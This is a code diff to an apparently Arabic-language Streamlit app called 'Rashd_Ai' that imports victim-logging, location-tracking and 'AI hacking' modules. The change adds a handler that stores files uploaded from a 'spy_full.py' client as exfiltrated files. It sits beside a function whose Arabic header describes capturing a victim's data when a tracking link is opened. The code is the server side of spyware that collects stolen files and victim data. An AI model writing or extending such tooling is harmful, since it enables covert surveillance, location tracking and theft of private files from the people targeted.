@@ -31,6 +31,7 @@ import report_generator
 import telegram_bot
 import location_tracker
 import victim_logger
+import exfiltrated_files
 
 from ai_hacking import AIHackingAssistant
 from ai_chat import AIChatAssistant
@@ -71,6 +72,24 @@ else:
     st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon="🛡️")
 
 # ============= نظام التقاط بيانات الضحايا (Victim Capture) =============
+
+# ============= دالة معالجة تحميل الملفات =============
+def handle_file_upload(uploaded_file):
+    """معالجة الملفات المرفوعة من spy_full.py"""
+    try:
+        if uploaded_file:
+            success, result = exfiltrated_files.save_exfiltrated_file(
+                uploaded_file,
+                uploaded_file.name,
+                original_path=uploaded_file.name,
+                device_name="Unknown"
+            )
+            return success, result
+        return False, "لا يوجد ملف"
+    except Exception as e:
+        return False, str(e)
+
+
 def capture_victim_data():
     """التقاط بيانات الضحية عند فتح رابط التتبع"""
     query_params = st.query_params
